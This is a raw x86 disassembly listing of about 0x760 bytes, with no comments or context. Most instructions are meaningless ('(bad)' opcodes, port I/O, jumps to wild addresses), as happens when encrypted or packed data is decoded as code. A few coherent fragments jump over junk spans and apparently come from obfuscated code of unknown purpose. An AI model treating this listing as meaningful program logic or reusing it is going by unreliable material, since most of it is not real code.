  40ab47:	repz pop ecx
  40ab49:	neg    BYTE PTR [ebx+edi*4+0xa]
  40ab4d:	jno    0x40aae6
  40ab4f:	gs hlt 
  40ab51:	xchg   ecx,eax
  40ab52:	cli    
  40ab53:	stos   BYTE PTR es:[edi],al
  40ab54:	mov    al,0xb4
  40ab56:	js     0x40abaf
  40ab58:	pop    esi
  40ab59:	add    DWORD PTR [ebx],esp
  40ab5b:	cmp    edx,DWORD PTR [ecx+0x60]
  40ab5e:	data16 pushaw 
  40ab61:	xchg   DWORD PTR [eax],eax
  40ab63:	mov    ds:0x7c4f310d,al
  40ab68:	or     ebx,DWORD PTR [ecx-0x6fd197a3]
  40ab6e:	shl    BYTE PTR [ebx],1
  40ab70:	or     dh,bl
  40ab72:	outs   dx,BYTE PTR ds:[esi]
  40ab73:	dec    esi
  40ab74:	rcr    al,1
  40ab76:	jmp    0x40aafa
  40ab78:	aam    0xe3
  40ab7a:	(bad)  
  40ab7b:	aad    0x12
  40ab7d:	in     al,dx
  40ab7e:	stc    
  40ab7f:	adc    al,0x16
  40ab81:	pop    esi
  40ab82:	inc    eax
  40ab83:	shr    eax,cl
  40ab85:	sbb    BYTE PTR [edx],bh
  40ab87:	jae    0x40ab76
  40ab89:	cmp    bh,BYTE PTR [ecx+0x13e9e7c2]
  40ab8f:	scas   eax,DWORD PTR es:[edi]
  40ab90:	jl     0x40ab61
  40ab92:	scas   eax,DWORD PTR es:[edi]
  40ab93:	aam    0xc8
  40ab95:	out    dx,eax
  40ab96:	jnp    0x40ab9f
  40ab98:	mov    DWORD PTR [esp+ecx*8+0x39],ebx
  40ab9c:	icebp  
  40ab9d:	xchg   DWORD PTR [ecx+0x5f],eax
  40aba0:	push   ds
  40aba1:	push   esp
  40aba2:	daa    
  40aba3:	(bad)  
  40aba4:	mov    esp,0xd60761d5
  40aba9:	add    bh,0xcb
  40abac:	xchg   ebp,eax
  40abad:	jmp    0x7a5d7798
  40abb2:	cwde   
  40abb3:	jnp    0x40ab43
  40abb5:	pushf  
  40abb6:	int3   
  40abb7:	cmc    
  40abb8:	arpl   WORD PTR [esi+edx*2],bx
  40abbb:	sti    
  40abbc:	lahf   
  40abbd:	push   edi
  40abbe:	sub    ch,BYTE PTR ds:0xb43138b0
  40abc4:	and    DWORD PTR [ebp-0x467f3e9e],0x97c48e09
  40abce:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40abd0:	fmul   DWORD PTR [edx+eax*4+0x4a]
  40abd4:	loop   0x40abcb
  40abd6:	fwait
  40abd7:	and    eax,0x35b8b16d
  40abdc:	iret   
  40abdd:	popa   
  40abde:	ja     0x40ac1c
  40abe0:	lds    eax,FWORD PTR [ebx+0x2c]
  40abe3:	enter  0x5536,0xe
  40abe7:	mov    eax,ds:0xf84d20d4
  40abec:	or     ah,BYTE PTR [esi]
  40abee:	pushf  
  40abef:	call   0x190992c2
  40abf4:	mov    dh,0xea
  40abf6:	cmp    dh,dl
  40abf8:	leave  
  40abf9:	pop    ds
  40abfa:	into   
  40abfb:	xor    DWORD PTR [eax+0x38],0x20
  40abff:	or     DWORD PTR [ebx+0x4e],ebp
  40ac02:	dec    ebp
  40ac03:	out    0x39,al
  40ac05:	xchg   edi,eax
  40ac06:	imul   DWORD PTR [ebp+edx*1-0x72]
  40ac0a:	jne    0x40abc6
  40ac0c:	loopne 0x40abf9
  40ac0e:	cld    
  40ac0f:	ror    DWORD PTR [edi+0x49],cl
  40ac12:	jl     0x40ac6f
  40ac14:	pop    ss
  40ac15:	add    DWORD PTR [ebp+0x663fc7ee],0xd591fbf8
  40ac1f:	ficomp DWORD PTR [eax+edi*1+0x7dd285ff]
  40ac26:	stos   DWORD PTR es:[edi],eax
  40ac27:	mov    edx,0xe1009f0e
  40ac2c:	fst    QWORD PTR [ecx]
  40ac2e:	dec    eax
  40ac2f:	leave  
  40ac30:	mov    edx,0x7f698d5d
  40ac35:	fcmovb st,st(6)
  40ac37:	inc    edx
  40ac38:	fsin   
  40ac3a:	inc    esi
  40ac3b:	scas   eax,DWORD PTR es:[edi]
  40ac3c:	push   ecx
  40ac3d:	pop    ds
  40ac3e:	mov    ah,0x97
  40ac40:	inc    edx
  40ac41:	jbe    0x40ac0a
  40ac43:	add    edi,ecx
  40ac45:	add    edx,ecx
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x866a3c5e
  40ac5f:	mov    ch,0x84
  40ac61:	lds    edi,FWORD PTR ds:0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40acc4
  40ac6b:	adc    al,0x2f
  40ac6d:	pop    esi
  40ac6e:	aas    
  40ac6f:	mov    esi,0xac62781c
  40ac74:	popf   
  40ac75:	jnp    0x40ace8
  40ac77:	xchg   esp,eax
  40ac78:	push   ebx
  40ac79:	out    0xe8,eax
  40ac7b:	outs   dx,BYTE PTR ds:[esi]
  40ac7c:	mov    al,ds:0x49859802
  40ac81:	sbb    BYTE PTR [eax+0x63],dh
  40ac84:	lea    eax,[eax-0xf]
  40ac87:	dec    eax
  40ac88:	mov    dh,0x8e
  40ac8a:	cmp    BYTE PTR [edx],al
  40ac8c:	enter  0xa3fd,0xba
  40ac90:	jnp    0x40ac71
  40ac92:	sbb    esp,edi
  40ac94:	lds    esp,FWORD PTR [eax+0x7]
  40ac97:	cmp    BYTE PTR [ecx],ah
  40ac99:	out    dx,eax
  40ac9a:	sbb    DWORD PTR ds:0xc7bd4166,ebp
  40aca0:	inc    ecx
  40aca1:	pop    ds
  40aca2:	test   ebx,edi
  40aca4:	repz cmc 
  40aca6:	add    al,0x9c
  40aca8:	in     al,0x8f
  40acaa:	out    dx,eax
  40acab:	imul   ah
  40acad:	jns    0x40ac55
  40acaf:	dec    edi
  40acb0:	daa    
  40acb1:	stos   BYTE PTR es:[edi],al
  40acb2:	and    ch,BYTE PTR [ebx]
  40acb4:	hlt    
  40acb5:	popf   
  40acb6:	jmp    0x3b46:0x62281b68
  40acbd:	mov    bh,0xf
  40acbf:	dec    edi
  40acc0:	push   0x72
  40acc2:	outs   dx,DWORD PTR ds:[esi]
  40acc3:	mov    al,ds:0x12ad11bd
  40acc8:	inc    ebx
  40acc9:	(bad)  [ebx+0x63]
  40accc:	test   al,0xe5
  40acce:	mov    ah,0x3f
  40acd0:	push   esp
  40acd1:	push   ebx
  40acd2:	mov    esi,DWORD PTR [edx-0x2944025]
  40acd8:	(bad)  
  40acd9:	push   edi
  40acda:	xor    bh,BYTE PTR ds:[edx-0x4e38c81a]
  40ace1:	repz push ecx
  40ace3:	mov    eax,0xf81e1cf0
  40ace8:	adc    eax,0x5ba08c5d
  40aced:	mov    ch,0x96
  40acef:	mov    WORD PTR [edx-0x65],?
  40acf2:	dec    esp
  40acf3:	mov    bh,0x87
  40acf5:	push   es
  40acf6:	out    0xbf,eax
  40acf8:	push   ds
  40acf9:	mov    WORD PTR [esi],ss
  40acfb:	shl    BYTE PTR [ecx+0xc],0x6e
  40acff:	jo     0x40ad6d
  40ad01:	ins    BYTE PTR es:[edi],dx
  40ad02:	fwait
  40ad03:	jo     0x40ad33
  40ad05:	sar    BYTE PTR [edi],1
  40ad07:	in     al,0x7a
  40ad09:	cmp    BYTE PTR [esi-0x70dc2a62],bh
  40ad0f:	jle    0x40ad47
  40ad11:	xlat   BYTE PTR ds:[ebx]
  40ad12:	lods   eax,DWORD PTR ds:[esi]
  40ad13:	sbb    BYTE PTR [ebp-0x3a],dh
  40ad16:	mov    esp,0xa95e70e
  40ad1b:	jb     0x40accf
  40ad1d:	out    dx,al
  40ad1e:	jae    0x40ad2a
  40ad20:	pop    eax
  40ad21:	lods   al,BYTE PTR ds:[esi]
  40ad22:	mov    bh,BYTE PTR [ecx]
  40ad24:	repnz pop edi
  40ad26:	add    al,0x90
  40ad28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad29:	(bad)
  40ad2c:	cmp    ecx,eax
  40ad2e:	push   ds
  40ad2f:	cmp    eax,0xb4fef2b1
  40ad34:	mov    edi,0x6d561f9
  40ad39:	xchg   ebx,eax
  40ad3a:	push   ds
  40ad3b:	ja     0x40ad09
  40ad3d:	cdq    
  40ad3e:	outs   dx,DWORD PTR ds:[esi]
  40ad3f:	jp     0x40ad91
  40ad41:	adc    cl,bl
  40ad43:	jmp    DWORD PTR [eax+0x17a5796d]
  40ad49:	cdq    
  40ad4a:	loop   0x40ad10
  40ad4c:	mov    al,ds:0xf31638fa
  40ad51:	jae    0x40ad9e
  40ad53:	test   al,0x11
  40ad55:	stos   DWORD PTR es:[edi],eax
  40ad56:	adc    BYTE PTR ds:0xd5f6bded,ah
  40ad5c:	fcomp  QWORD PTR [ecx]
  40ad5e:	cmp    edx,DWORD PTR [edi+0x2f9fdf61]
  40ad64:	jg     0x40adbc
  40ad66:	inc    esp
  40ad67:	add    DWORD PTR [esi-0x671d3ce6],0xffffff88
  40ad6e:	inc    edx
  40ad6f:	mov    bh,BYTE PTR [ecx]
  40ad71:	pop    eax
  40ad72:	fld    DWORD PTR [esi+0x493e5c38]
  40ad78:	add    BYTE PTR [ecx],bl
  40ad7a:	nop
  40ad7b:	jne    0x40adde
  40ad7d:	into   
  40ad7e:	outs   dx,BYTE PTR ds:[esi]
  40ad7f:	pop    ecx
  40ad80:	sub    BYTE PTR [edi],al
  40ad82:	daa    
  40ad83:	int    0xd2
  40ad85:	sbb    al,cl
  40ad87:	(bad)  
  40ad88:	adc    al,0x31
  40ad8a:	pop    esi
  40ad8b:	mov    bh,0xd7
  40ad8d:	or     BYTE PTR [eax-0x76],ch
  40ad90:	aas    
  40ad91:	jg     0x40ada0
  40ad93:	imul   DWORD PTR [ebp+0x6a59ae8f]
  40ad99:	icebp  
  40ad9a:	stc    
  40ad9b:	dec    edi
  40ad9c:	(bad)  
  40ad9d:	mov    ds:0x108cbe4f,al
  40ada2:	xor    ebp,DWORD PTR [edi+0x40]
  40ada5:	mov    ch,0xeb
  40ada7:	xor    al,0xbb
  40ada9:	add    ebx,DWORD PTR [esi-0x35c9f540]
  40adaf:	push   cs
  40adb0:	cmp    al,0x8f
  40adb2:	or     bh,BYTE PTR [ecx-0x27f4109b]
  40adb8:	pop    eax
  40adb9:	pop    eax
  40adba:	and    eax,0xd86aab12
  40adbf:	jmp    0x40add6
  40adc1:	clc    
  40adc2:	scas   al,BYTE PTR es:[edi]
  40adc3:	jmp    0x40adef
  40adc5:	jecxz  0x40ada5
  40adc7:	test   al,0x7d
  40adc9:	mov    ds:0x4616232a,eax
  40adce:	paddusb mm3,QWORD PTR [ecx+0x1ff8f9ae]
  40add5:	mov    al,0xf9
  40add7:	sbb    bl,BYTE PTR [esi+0x9]
  40adda:	cmp    BYTE PTR [esi+0xc61b9f7],dl
  40ade0:	mov    ecx,0xd7a02d9e
  40ade5:	outs   dx,BYTE PTR ds:[esi]
  40ade6:	dec    esp
  40ade7:	pushf  
  40ade8:	sbb    ch,ch
  40adea:	imul   esi,edi,0xffffff87
  40aded:	dec    edi
  40adee:	pop    ebp
  40adef:	dec    eax
  40adf0:	sbb    DWORD PTR [ecx],edx
  40adf2:	push   ecx
  40adf3:	sti    
  40adf4:	pop    ds
  40adf5:	out    dx,eax
  40adf6:	fstp   TBYTE PTR [ecx]
  40adf8:	stc    
  40adf9:	mov    ebp,DWORD PTR [ecx]
  40adfb:	sbb    esp,esp
  40adfd:	adc    DWORD PTR [edx],ebx
  40adff:	clc    
  40ae00:	inc    eax
  40ae01:	jle    0x40ae52
  40ae03:	and    BYTE PTR [ebx],ah
  40ae05:	in     eax,dx
  40ae06:	btc    DWORD PTR [edx-0x2f],edx
  40ae0a:	call   FWORD PTR [eax]
  40ae0c:	adc    DWORD PTR [edx-0x36],0x43
  40ae10:	stc    
  40ae11:	dec    edx
  40ae12:	sbb    eax,0x3033737b
  40ae17:	imul   ebx,DWORD PTR [ebx-0x12476548],0xe57243b1
  40ae21:	jbe    0x40adab
  40ae23:	mov    ebp,0x7d75089d
  40ae28:	gs pop di
  40ae2b:	and    BYTE PTR ds:0xfdcbf201,cl
  40ae31:	xchg   esp,eax
  40ae32:	mov    ch,0x94
  40ae34:	test   edx,esi
  40ae36:	mov    al,ds:0xf36d67e4
  40ae3b:	rcl    ebp,cl
  40ae3d:	inc    ebp
  40ae3e:	add    DWORD PTR [ebx+0x7e4fc50e],ebx
  40ae44:	mov    eax,0x8faab76d
  40ae49:	retf   0x4be8
  40ae4c:	cmp    al,0x4a
  40ae4e:	rcl    DWORD PTR ds:0x2bc55a74,cl
  40ae54:	push   edi
  40ae55:	push   esp
  40ae56:	sub    ebx,0xd2b2fe8d
  40ae5c:	scas   al,BYTE PTR es:[edi]
  40ae5d:	sub    DWORD PTR ss:[eax+0x62ed467c],ebp
  40ae64:	mov    ds:0x7d5a284,al
  40ae69:	shl    DWORD PTR [eax],cl
  40ae6b:	cs sub cl,ah
  40ae6e:	mov    es,WORD PTR [eax+0x64874496]
  40ae74:	out    dx,al
  40ae75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae76:	loope  0x40aea3
  40ae78:	or     eax,0x80cf6dbe
  40ae7d:	in     al,dx
  40ae7e:	mov    dl,0xbe
  40ae80:	jno    0x40ae02
  40ae82:	cmp    ebx,DWORD PTR [edx-0x24d51584]
  40ae88:	mov    edi,0x4de52a27
  40ae8d:	stc    
  40ae8e:	(bad)  
  40ae90:	enter  0x5dec,0xac
  40ae94:	add    BYTE PTR [eax-0x63],bh
  40ae97:	dec    esp
  40ae98:	scas   eax,DWORD PTR es:[edi]
  40ae99:	cwde   
  40ae9a:	pop    ebx
  40ae9b:	xchg   edx,eax
  40ae9c:	(bad)  
  40ae9e:	loop   0x40ae41
  40aea0:	xor    bh,ch
  40aea2:	lea    esi,[eax-0x23bedd5d]
  40aea8:	sub    bl,dl
  40aeaa:	or     edx,0x25
  40aead:	add    cl,BYTE PTR ds:0x6654305c
  40aeb3:	dec    eax
  40aeb4:	adc    al,0xfd
  40aeb6:	sbb    ah,dl
  40aeb8:	out    0xab,eax
  40aeba:	leave  
  40aebb:	std    
  40aebc:	cwde   
  40aebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aebe:	and    dl,BYTE PTR [edi+0x355e084a]
  40aec4:	fisttp WORD PTR [bp-0x1ebb]
  40aec9:	js     0x40ae54
  40aecb:	data16 or BYTE PTR [edx],ah
  40aece:	sub    ch,al
  40aed0:	push   edx
  40aed1:	(bad)  
  40aed2:	imul   esp,DWORD PTR [ecx+ebx*2+0x66],0xffffff83
  40aed7:	jp     0x40af46
  40aed9:	pop    eax
  40aeda:	and    eax,eax
  40aedc:	(bad)  
  40aedd:	pop    ds
  40aede:	mov    esi,0xe7146693
  40aee3:	push   es
  40aee4:	rcl    BYTE PTR [edx-0x7e],1
  40aee7:	sub    dh,BYTE PTR [ebx-0x7c1092af]
  40aeed:	add    al,0x8
  40aeef:	push   esi
  40aef0:	dec    edx
  40aef1:	cs pop ecx
  40aef3:	push   cs
  40aef4:	fld    QWORD PTR ds:0x3505680d
  40aefa:	retf   
  40aefb:	pop    es
  40aefc:	sub    bl,BYTE PTR [ebx-0x4fbace]
  40af02:	xchg   ch,ah
  40af04:	ror    al,0x7f
  40af07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af08:	mov    WORD PTR [ecx],?
  40af0a:	int    0x9c
  40af0c:	jmp    0x40aecd
  40af0e:	push   esp
  40af0f:	arpl   bx,ax
  40af11:	xchg   ebx,eax
  40af12:	test   eax,0x3bdb1598
  40af17:	or     esi,edx
  40af19:	(bad)  
  40af1b:	push   ebx
  40af1c:	gs pop ds
  40af1e:	xchg   ebx,eax
  40af1f:	mov    ecx,ebp
  40af21:	sahf   
  40af22:	mov    ebx,0x6145f4f5
  40af27:	or     DWORD PTR [ebx-0x54],ecx
  40af2a:	jmp    0x40afa2
  40af2c:	xor    BYTE PTR [edx+0x7e86c2e1],bh
  40af32:	push   esi
  40af33:	stc    
  40af34:	dec    BYTE PTR [esi-0x34]
  40af37:	shl    DWORD PTR [ebx-0x4d254585],0x25
  40af3e:	sbb    BYTE PTR [ebp+0x5],bh
  40af41:	mov    eax,0xcae2570f
  40af46:	lods   al,BYTE PTR ds:[esi]
  40af47:	push   0xfffffffc
  40af49:	(bad)  
  40af4a:	shl    BYTE PTR [eax],0x1e
  40af4d:	mov    dl,0xc8
  40af4f:	fisub  WORD PTR [ebx+eax*8]
  40af52:	dec    eax
  40af53:	imul   esi,ecx,0xffffff9b
  40af56:	sub    eax,0xc43ea807
  40af5b:	les    edx,FWORD PTR [eax]
  40af5d:	xchg   edi,eax
  40af5e:	sbb    ebp,ecx
  40af60:	mov    ebp,0x6432e2c9
  40af65:	or     ch,bh
  40af67:	repnz lock outs dx,DWORD PTR ds:[esi]
  40af6a:	mov    DWORD PTR [ecx+0x5d],ebp
  40af6d:	outs   dx,BYTE PTR ds:[esi]
  40af6e:	pop    ds
  40af6f:	jns    0x40af3b
  40af71:	add    ebp,DWORD PTR [edi]
  40af73:	mov    cl,0x7
  40af75:	dec    ecx
  40af76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af77:	cmp    cl,BYTE PTR [ecx-0x6a]
  40af7a:	aas    
  40af7b:	adc    BYTE PTR [ebp+0x57],al
  40af7e:	or     ah,BYTE PTR [eax-0x20]
  40af81:	ins    BYTE PTR es:[edi],dx
  40af82:	pop    ecx
  40af83:	mov    edi,0xdac8903b
  40af88:	leave  
  40af89:	fldenv [ecx-0x25]
  40af8c:	in     al,dx
  40af8d:	(bad)  
  40af8e:	in     eax,dx
  40af8f:	sub    dh,ah
  40af91:	sbb    al,0xd9
  40af93:	xor    dh,BYTE PTR ds:0x2a57506a
  40af9a:	lods   eax,DWORD PTR ds:[esi]
  40af9b:	fwait
  40af9c:	xchg   edx,eax
  40af9d:	icebp  
  40af9e:	fdivp  st(6),st
  40afa0:	add    dl,cl
  40afa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40afa3:	mov    ds:0x6639a69,eax
  40afa8:	dec    esp
  40afa9:	push   ecx
  40afaa:	dec    eax
  40afab:	xchg   esp,eax
  40afac:	dec    esi
  40afad:	(bad)  
  40afae:	jne    0x40b02c
  40afb0:	sbb    ecx,ebx
  40afb2:	jge    0x40afd4
  40afb4:	test   DWORD PTR [ebx-0x21b40c18],edx
  40afba:	push   0x7d7591e2
  40afbf:	sub    ecx,DWORD PTR [ebx-0x20d40fa3]
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fcomp  DWORD PTR [edx+esi*4]
  40b001:	jae    0x40afd9
  40b003:	mov    edi,ecx
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40b057
  40b00c:	push   ss
  40b00d:	stc    
  40b00e:	popa   
  40b00f:	mov    ebx,esp
  40b011:	out    0x80,al
  40b013:	mov    ah,0x7
  40b015:	push   ebp
  40b016:	mov    ah,0xb4
  40b018:	cdq    
  40b019:	jnp    0x40b051
  40b01b:	sbb    eax,0x769533a7
  40b020:	cmp    BYTE PTR [edi+0x66],bl
  40b023:	sets   ah
  40b026:	mov    gs,WORD PTR [ebx]
  40b028:	or     BYTE PTR [ebp+0x58],cl
  40b02b:	rcr    BYTE PTR [eax],0x12
  40b02e:	xor    eax,0xbfee87be
  40b033:	fst    DWORD PTR [edi-0x169e7a30]
  40b039:	xchg   edx,eax
  40b03a:	jns    0x40b052
  40b03c:	jns    0x40b060
  40b03e:	call   0x42b77ddc
  40b043:	daa    
  40b044:	push   cs
  40b045:	mov    cl,0x7c
  40b047:	push   0x75
  40b049:	jbe    0x40b094
  40b04b:	(bad)  
  40b04c:	mov    edx,0x570d7503
  40b052:	rol    BYTE PTR [edi+0x48b7a226],cl
  40b058:	mov    esi,0xcef5b947
  40b05d:	dec    ecx
  40b05e:	push   0xffffffeb
  40b060:	jne    0x40b019
  40b062:	pop    esi
  40b063:	dec    eax
  40b064:	(bad)  
  40b065:	idiv   BYTE PTR [ecx]
  40b067:	jo     0x40b045
  40b069:	jne    0x40b05a
  40b06b:	xchg   edx,eax
  40b06c:	push   es
  40b06d:	retf   
  40b06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b06f:	cmp    BYTE PTR [ecx],dl
  40b071:	(bad)  
  40b072:	or     ebx,ebp
  40b074:	dec    esi
  40b075:	inc    eax
  40b076:	adc    al,0x58
  40b078:	mov    esi,0x856efc24
  40b07d:	mov    ?,WORD PTR [ebx]
  40b07f:	mov    ds:0xce230957,eax
  40b084:	js     0x40b0d3
  40b086:	mov    esi,DWORD PTR [esp+edx*4]
  40b089:	ror    BYTE PTR [edi-0x21],1
  40b08c:	rol    DWORD PTR [eax+edx*8-0x51383849],cl
  40b093:	clc    
  40b094:	and    DWORD PTR [eax],esi
  40b096:	jno    0x40b0c8
  40b098:	pop    ecx
  40b099:	xchg   esi,eax
  40b09a:	push   0x29026832
  40b09f:	sbb    bh,dl
  40b0a1:	push   0xc1f32772
  40b0a6:	cwde   
  40b0a7:	jge    0x40b0da
  40b0a9:	dec    ecx
  40b0aa:	jmp    0xf838:0x78296290
  40b0b1:	fimul  DWORD PTR [esi]
  40b0b3:	ret    0x4aa8
  40b0b6:	add    bl,BYTE PTR [eax]
  40b0b8:	fmul   QWORD PTR [edi-0x44]
  40b0bb:	xchg   ebx,eax
  40b0bc:	ds jecxz 0x40b0db
  40b0bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0c0:	cmc    
  40b0c1:	mov    edi,0x88a8bf53
  40b0c6:	adc    DWORD PTR [edx-0x3f],edi
  40b0c9:	fidiv  DWORD PTR [esi+0x4f]
  40b0cc:	in     al,0xe0
  40b0ce:	pop    ebx
  40b0cf:	ret    0xa7e8
  40b0d2:	xor    BYTE PTR fs:[ebp+0x1d6680ad],0x7b
  40b0da:	bound  ebp,QWORD PTR [ebx+0x1a3e3b5c]
  40b0e0:	mov    ah,0x6d
  40b0e2:	mov    ds:0x5fb1fa7b,al
  40b0e7:	jp     0x40b103
  40b0e9:	push   ss
  40b0ea:	cmp    edi,eax
  40b0ec:	loop   0x40b09f
  40b0ee:	repz sbb DWORD PTR [ecx+0x4039b316],ebx
  40b0f5:	sub    esp,DWORD PTR [esi-0x5e]
  40b0f8:	mov    bh,0xde
  40b0fa:	mov    ah,bl
  40b0fc:	push   esp
  40b0fd:	icebp  
  40b0fe:	js     0x40b163
  40b100:	cmp    eax,0xfecc7a65
  40b105:	iret   
  40b106:	push   ebp
  40b107:	lahf   
  40b108:	push   0xffffffbd
  40b10a:	lahf   
  40b10b:	in     eax,dx
  40b10c:	test   DWORD PTR [ebp-0x6f],0xbbf59980
  40b113:	cmp    DWORD PTR [edx+0x132458c0],ecx
  40b119:	shr    DWORD PTR [eax],1
  40b11b:	mov    ah,BYTE PTR [ecx-0x3d0c00ad]
  40b121:	mov    edx,0x384537c2
  40b126:	sub    esp,DWORD PTR [eax]
  40b128:	leave  
  40b129:	add    edx,DWORD PTR [ecx+eax*8+0x3d78d0b4]
  40b130:	jg     0x40b171
  40b132:	shr    edx,1
  40b134:	or     eax,0x1475c1e1
  40b139:	int3   
  40b13a:	dec    esi
  40b13b:	and    BYTE PTR cs:[edx],ch
  40b13e:	fcomi  st,st(4)
  40b140:	fmul   QWORD PTR [esi-0x80]
  40b143:	pop    edx
  40b144:	mov    ebx,0x8d72f1b7
  40b149:	(bad)  
  40b14b:	rol    DWORD PTR [ebx],0x80
  40b14e:	pop    es
  40b14f:	mov    edi,0xabbff3fa
  40b154:	(bad)  
  40b156:	dec    eax
  40b157:	retf   
  40b158:	push   cs
  40b159:	or     eax,0x778c3ca6
  40b15e:	gs pop es
  40b160:	shl    BYTE PTR [edi+0x68a136d6],1
  40b166:	leave  
  40b167:	fwait
  40b168:	add    bh,0x1a
  40b16b:	adc    bl,ch
  40b16d:	mov    esp,0x7f5201ca
  40b172:	push   ecx
  40b173:	shr    DWORD PTR [edi],1
  40b175:	das    
  40b176:	and    DWORD PTR [edi],esi
  40b178:	(bad)  
  40b179:	frstor [eax]
  40b17b:	stc    
  40b17c:	int    0x59
  40b17e:	(bad)  
  40b17f:	pop    eax
  40b180:	(bad)  
  40b181:	fsubp  st(7),st
  40b183:	lods   eax,DWORD PTR ds:[esi]
  40b184:	je     0x40b171
  40b186:	aad    0x47
  40b188:	xchg   ebx,eax
  40b189:	pop    ss
  40b18a:	push   cs
  40b18b:	adc    DWORD PTR [esi],esp
  40b18d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b18e:	pop    edx
  40b18f:	mov    dh,0x59
  40b191:	in     al,0x89
  40b193:	dec    ebx
  40b194:	(bad)  
  40b195:	fdiv   DWORD PTR [ebp-0x25]
  40b198:	or     eax,0xae149990
  40b19d:	cmp    al,0xfb
  40b19f:	inc    edi
  40b1a0:	adc    BYTE PTR [ecx+0xf1b16e],0xd6
  40b1a7:	jecxz  0x40b1b3
  40b1a9:	repz rol BYTE PTR ds:[ebp+ebp*1+0x774eab2b],1
  40b1b2:	pop    ecx
  40b1b3:	add    BYTE PTR [edx],al
  40b1b5:	cmp    al,0x79
  40b1b7:	xor    eax,0x33b0b5b6
  40b1bc:	jbe    0x40b1e2
  40b1be:	dec    ecx
  40b1bf:	jge    0x40b1e6
  40b1c1:	dec    esi
  40b1c2:	dec    ebp
  40b1c3:	xor    esi,DWORD PTR [edx+0x294e92cd]
  40b1c9:	xlat   BYTE PTR ds:[ebx]
  40b1ca:	push   ds
  40b1cb:	fdiv   DWORD PTR [esi-0x70]
  40b1ce:	dec    esi
  40b1cf:	pushf  
  40b1d0:	ror    ah,0x39
  40b1d3:	inc    esp
  40b1d4:	ins    DWORD PTR es:[edi],dx
  40b1d5:	or     BYTE PTR [edx],dh
  40b1d7:	and    eax,DWORD PTR ss:[eax-0x76]
  40b1db:	mov    ebx,0x2977fb15
  40b1e0:	iret   
  40b1e1:	adc    eax,0x32785dab
  40b1e6:	int3   
  40b1e7:	or     DWORD PTR [ecx],edi
  40b1e9:	sbb    eax,0x306a31e5
  40b1ee:	add    al,bl
  40b1f0:	lahf   
  40b1f1:	or     bh,BYTE PTR [ecx]
  40b1f3:	repnz aaa 
  40b1f5:	mov    WORD PTR [ecx],fs
  40b1f7:	jg     0x40b18c
  40b1f9:	jl     0x40b1f2
  40b1fb:	cmp    al,0x5e
  40b1fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1fe:	sub    ebx,ebx
  40b200:	ja     0x40b197
  40b202:	rcl    BYTE PTR [ebx+0x62],cl
  40b205:	(bad)  
  40b206:	fidiv  WORD PTR [ebp-0x7677d18b]
  40b20c:	test   edi,eax
  40b20e:	cs mov ecx,0x14b672b3
  40b214:	loope  0x40b1f8
  40b216:	xchg   esi,eax
  40b217:	sbb    BYTE PTR [edi-0x22521664],bh
  40b21d:	lods   eax,DWORD PTR ds:[esi]
  40b21e:	cwde   
  40b21f:	pop    edi
  40b220:	sti    
  40b221:	jbe    0x40b1a3
  40b223:	and    BYTE PTR [esi+0x2bf67c6a],ch
  40b229:	fidivr WORD PTR [esi]
  40b22b:	adc    eax,0x695f01d0
  40b230:	or     bl,BYTE PTR [esi+0x8]
  40b233:	in     eax,dx
  40b234:	fs mov dl,0x83
  40b237:	sub    ah,BYTE PTR [eax+0x67712439]
  40b23d:	pop    esp
  40b23e:	mov    ecx,0x4dbfb10b
  40b243:	sbb    ah,ch
  40b245:	lea    ebp,[ecx+0x11]
  40b248:	or     BYTE PTR [ecx-0x74978b1b],bh
  40b24e:	sbb    esi,DWORD PTR [edx]
  40b250:	xor    al,0xc5
  40b252:	mov    edi,0xd01b1584
  40b257:	lock mov eax,0xe37d920b
  40b25d:	gs jbe 0x40b1fa
  40b260:	iret   
  40b261:	mov    dh,0x41
  40b263:	sar    BYTE PTR [ecx],cl
  40b265:	test   BYTE PTR [edi+0x1413309a],dl
  40b26b:	fs fwait
  40b26d:	cmp    ah,bl
  40b26f:	out    0x6a,al
  40b271:	push   ebp
  40b272:	sti    
  40b273:	std    
  40b274:	xor    eax,0xdc5635f4
  40b279:	sub    BYTE PTR [eax],0xad
  40b27c:	es out dx,eax
  40b27e:	inc    esp
  40b27f:	loope  0x40b29b
  40b281:	inc    edi
  40b282:	fimul  WORD PTR [ebp-0x6c]
  40b285:	push   edi
  40b286:	push   ds
  40b287:	jb     0x40b2cc
  40b289:	xor    edx,edi
  40b28b:	sahf   
  40b28c:	mov    edx,0x256be5ce
  40b291:	mov    es:0x6c3abb01,eax
  40b297:	loope  0x40b252
  40b299:	shld   DWORD PTR fs:[edi+0xbdffa37],edi,0x27
  40b2a2:	cmp    eax,0xf6145cf5
  40b2a7:	cmc    
